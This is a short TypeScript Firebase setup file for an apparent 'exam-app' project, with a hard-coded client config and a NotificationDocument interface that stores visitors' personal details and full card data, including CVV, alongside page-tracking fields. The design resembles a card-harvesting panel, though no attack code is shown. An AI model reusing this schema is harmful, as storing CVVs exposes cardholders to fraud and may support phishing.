import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyC-fR9vsFJ0gyOcysg5SG5DMtATNzTyW1c",
  authDomain: "exam-app-2ec1d.firebaseapp.com",
  databaseURL: "https://exam-app-2ec1d-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "exam-app-2ec1d",
  storageBucket: "exam-app-2ec1d.firebasestorage.app",
  messagingSenderId: "116559499407",
  appId: "1:116559499407:web:8c5ecf129f5c437e3ea0fa",
  measurementId: "G-MY09H839C3"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

